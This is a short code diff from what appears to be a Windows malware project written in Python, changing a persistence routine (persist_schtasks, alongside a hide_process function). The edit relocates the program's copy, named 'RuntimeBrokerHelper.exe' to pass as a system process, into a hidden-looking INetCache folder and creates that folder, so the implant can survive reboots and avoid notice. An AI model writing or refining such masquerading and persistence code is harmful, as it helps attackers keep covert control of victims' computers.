@@ -417,7 +417,9 @@ def hide_process():
 def persist_schtasks():
     try:
         exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
-        appdata_path = os.path.join(os.getenv('APPDATA'), 'RuntimeBrokerHelper.exe') # this will be the PE file name
+        appdata_path = os.path.join(os.getenv('LOCALAPPDATA'), r'Microsoft\Windows\INetCache\Content.MSO\RuntimeBrokerHelper.exe') # this will be the PE file name
+        if not os.path.exists(os.path.dirname(appdata_path)):
+            os.makedirs(os.path.dirname(appdata_path))
         if exe_path != appdata_path:
             shutil.copy2(exe_path, appdata_path)
         exe_path = f'"{os.path.normpath(appdata_path)}"'
